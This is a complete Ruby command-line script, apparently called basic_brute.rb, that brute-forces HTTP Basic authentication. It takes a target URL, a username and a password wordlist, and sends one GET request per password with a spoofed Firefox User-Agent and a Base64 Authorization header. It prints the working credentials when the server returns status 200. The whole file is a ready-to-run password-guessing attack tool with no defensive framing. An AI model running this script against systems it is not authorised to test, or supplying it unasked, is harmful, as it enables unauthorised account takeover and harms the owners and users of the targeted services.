require 'faraday'
require 'base64'

if ARGV.length == 3
	# Grabs CLI arguments
	url = ARGV[0]
	username = ARGV[1]
	passwords = File.open(ARGV[2].to_s)
	con = Faraday.new
	# Iterates over each password in the list
	passwords.each do |password|
		print "[*]Testing #{username}:#{password.chomp}."
        #Base64 encodes the username anad password to generate our payload
        payload = Base64.encode64("#{username}:#{password.chomp}")
        #Sends the GET request
		res = con.get do |req|
			req.url url
			req.headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
            #Sets the basic auth header with our generated payload
			req.headers['Authorization'] = "Basic #{payload}"
		end
		# Checks the response code. Failed requests do nothing, 200's print the working creds.
		if res.status != 200
            print "\r" + ("\e[K")
		else
            print "\r" + ("\e[K")
			abort("SUCCESS: '#{username}:#{password.chomp}'." + "(" + res.status.to_s + ")")
		end
	end
else
	# Usage info
	puts "USAGE: ruby basic_brute.rb URL USERNAME /PATH/TO/WORDLIST.txt"
end